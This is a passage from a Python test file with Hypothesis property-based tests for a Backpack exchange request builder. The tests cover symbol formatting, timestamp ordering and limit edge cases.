    """Property-based tests for market parameter building."""

    @given(symbol=bp_symbol_strategy())
    @settings(max_examples=50)
    def test_build_get_market_params_property_based(self, symbol: Symbol) -> None:
        """Test build_get_market_params with property-based testing."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol)

        assert isinstance(params, BackpackRawGetMarketParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify basic structure
        assert "symbol" in params_dict
        assert isinstance(params_dict["symbol"], str)

        # Verify symbol formatting
        if "-PERP" in symbol.value or "PERP" in symbol.value:
            expected_symbol = symbol.value.replace("-", "_").upper()
            assert params_dict["symbol"] == expected_symbol
        else:
            assert params_dict["symbol"] == symbol.value

    @given(symbol=bp_perp_symbol_strategy())
    @settings(max_examples=20)
    def test_build_get_market_params_perp_symbols(self, symbol: Symbol) -> None:
        """Test market params specifically for perpetual symbols."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol)

        assert isinstance(params, BackpackRawGetMarketParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify perp symbol formatting
        expected_symbol = symbol.value.replace("-", "_").upper()
        assert params_dict["symbol"] == expected_symbol

    @given(symbol=bp_spot_symbol_strategy())
    @settings(max_examples=20)
    def test_build_get_market_params_spot_symbols(self, symbol: Symbol) -> None:
        """Test market params specifically for spot symbols."""
        params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol)

        assert isinstance(params, BackpackRawGetMarketParams)
        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Spot symbols should remain unchanged
        assert params_dict["symbol"] == symbol.value


class TestPropertyBasedBoundaryConditions:
    """Property-based tests for boundary conditions and edge cases."""

    @given(symbol=bp_symbol_strategy())
    @settings(max_examples=30)
    def test_symbol_formatting_consistency(self, symbol: Symbol) -> None:
        """Test that symbol formatting is consistent across all methods."""
        ticker_params = BackpackMarketDataRequestBuilder.build_get_ticker_params(symbol)
        market_params = BackpackMarketDataRequestBuilder.build_get_market_params(symbol)
        order_book_params = BackpackMarketDataRequestBuilder.build_get_order_book_params(
            symbol, None
        )

        ticker_dict = ticker_params.model_dump(by_alias=True, exclude_none=True)
        market_dict = market_params.model_dump(by_alias=True, exclude_none=True)
        order_book_dict = order_book_params.model_dump(by_alias=True, exclude_none=True)

        # All methods should format symbols consistently
        assert ticker_dict["symbol"] == market_dict["symbol"]
        assert market_dict["symbol"] == order_book_dict["symbol"]

    @given(
        symbol=bp_symbol_strategy(),
        timestamp1=timestamp_strategy(),
        timestamp2=timestamp_strategy(),
    )
    @settings(max_examples=50)
    def test_timestamp_ordering(self, symbol: Symbol, timestamp1: int, timestamp2: int) -> None:
        """Test that timestamp ordering is handled correctly."""
        start_time = min(timestamp1, timestamp2)
        end_time = max(timestamp1, timestamp2)

        # Ensure there's a meaningful difference
        if end_time == start_time:
            end_time += 3600  # Add 1 hour

        params = BackpackMarketDataRequestBuilder.build_get_market_data_params(
            symbol, "1h", start_time, end_time, 100
        )

        params_dict = params.model_dump(by_alias=True, exclude_none=True)

        # Verify timestamps are correctly ordered and converted
        assert params_dict["startTime"] == start_time // 1000
        assert params_dict["endTime"] == end_time // 1000
        assert params_dict["startTime"] <= params_dict["endTime"]

    @given(
        symbol=bp_symbol_strategy(),
        zero_limit=st.just(0),
        negative_limit=st.integers(max_value=-1),
    )
    @settings(max_examples=10)
    def test_invalid_limits_handling(
        self, symbol: Symbol, zero_limit: int, negative_limit: int
    ) -> None:
        """Test handling of invalid limit values."""
        # These should potentially raise validation errors or be handled gracefully
        try:
            params = BackpackMarketDataRequestBuilder.build_get_order_book_params(
                symbol, zero_limit
            )
            params_dict = params.model_dump(by_alias=True, exclude_none=True)
            # If it doesn't raise an error, the limit should be included
            assert "limit" in params_dict
        except (ValueError, TypeError) as e:
            # Validation errors are acceptable for invalid inputs
            # We explicitly ignore these as we're testing boundary conditions
            _ = e  # Acknowledge the exception for linting

        try:
            params = BackpackMarketDataRequestBuilder.build_get_order_book_params(
                symbol, negative_limit
            )
            params_dict = params.model_dump(by_alias=True, exclude_none=True)
            # If it doesn't raise an error, the limit should be included
            assert "limit" in params_dict
        except (ValueError, TypeError) as e:
            # Validation errors are acceptable for invalid inputs
            # We explicitly ignore these as we're testing boundary conditions
            _ = e  # Acknowledge the exception for linting


class TestPropertyBasedLegacyCompatibility:
    """Tests to ensure property-based tests don't break legacy functionality."""

    def test_legacy_consistency_with_property_based(self) -> None:
        """Test that legacy and property-based approaches yield consistent results."""
        # Test ticker params
        legacy_ticker = BackpackMarketDataRequestBuilder.build_get_ticker_params(SOL_USDC_BP)
        pb_ticker = BackpackMarketDataRequestBuilder.build_get_ticker_params(SOL_USDC_BP)

        assert legacy_ticker.model_dump() == pb_ticker.model_dump()

        # Test order book params
        legacy_ob = BackpackMarketDataRequestBuilder.build_get_order_book_params(BTC_USDC_BP, 100)
        pb_ob = BackpackMarketDataRequestBuilder.build_get_order_book_params(BTC_USDC_BP, 100)

        assert legacy_ob.model_dump() == pb_ob.model_dump()

        # Test markets params
        legacy_markets = BackpackMarketDataRequestBuilder.build_get_markets_params()
        pb_markets = BackpackMarketDataRequestBuilder.build_get_markets_params()

        assert legacy_markets.model_dump() == pb_markets.model_dump()
